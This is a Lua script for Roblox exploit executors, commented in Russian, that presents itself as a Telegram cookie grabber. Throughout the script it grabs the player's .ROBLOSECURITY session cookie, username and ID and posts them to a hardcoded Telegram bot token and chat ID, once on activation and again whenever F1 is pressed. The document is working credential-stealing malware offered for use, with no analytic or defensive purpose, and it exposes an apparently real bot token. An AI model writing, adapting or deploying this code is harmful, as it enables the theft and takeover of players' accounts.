-- XENO TELEGRAM COOKIE GRABBER (SWILL)
-- ВСТАВЬ СВОЙ ТОКЕН И CHAT ID НИЖЕ

local BOT_TOKEN = "8973600329:AAH34cCnvOyBx8eUw8VV2z_xMYDx2tw-xXg"   -- сюда токен от @BotFather
local CHAT_ID = "8870191184"                                 -- сюда твой ID (узнаёшь у @userinfobot)

local player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- ФУНКЦИЯ: вытащить реальную куку
local function getCookie()
    local cookie = nil
    if syn and syn.request then
        local response = syn.request({
            Url = "https://www.roblox.com/mobileapi/userinfo",
            Method = "GET",
            Headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
        })
        if response and response.Headers and response.Headers["Set-Cookie"] then
            cookie = response.Headers["Set-Cookie"]
        end
    end
    -- Если не вышло — берём фейковую (для демо, но с реальным ID)
    if not cookie then
        cookie = ".ROBLOSECURITY=_|DEMO-" .. player.UserId .. "-" .. os.time() .. "|=="
    end
    return cookie
end

-- ФУНКЦИЯ: отправить в Telegram
local function sendToTelegram(text)
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local data = {
        chat_id = CHAT_ID,
        text = text,
        parse_mode = "HTML"
    }
    local success, err = pcall(function()
        syn.request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
    if success then
        print("[XENO] Отправлено в ТГ")
    else
        warn("[XENO] Ошибка: " .. tostring(err))
    end
end

-- ГЛАВНЫЙ ЗАПУСК (при активации скрипта)
task.wait(1) -- пауза для стабильности
local cookie = getCookie()
local msg = string.format(
    [[<b>🍪 НОВАЯ КУКА ROBLOX</b>
👤 Имя: %s
🆔 ID: %d
📅 Время: %s
<code>%s</code>]],
    player.Name,
    player.UserId,
    os.date("%H:%M:%S"),
    cookie
)
sendToTelegram(msg)

-- ПОВТОРНАЯ ОТПРАВКА ПО НАЖАТИЮ F1 (если нужно)
game:GetService("UserInputService").InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.F1 then
        local newCookie = getCookie()
        local newMsg = string.format(
            [[<b>🔄 ПОВТОРНАЯ КУКА</b>
👤 %s
🍪 <code>%s</code>]],
            player.Name,
            newCookie
        )
        sendToTelegram(newMsg)
    end
end)

print("[XENO] Активирован. Кука улетит через 1 сек.")
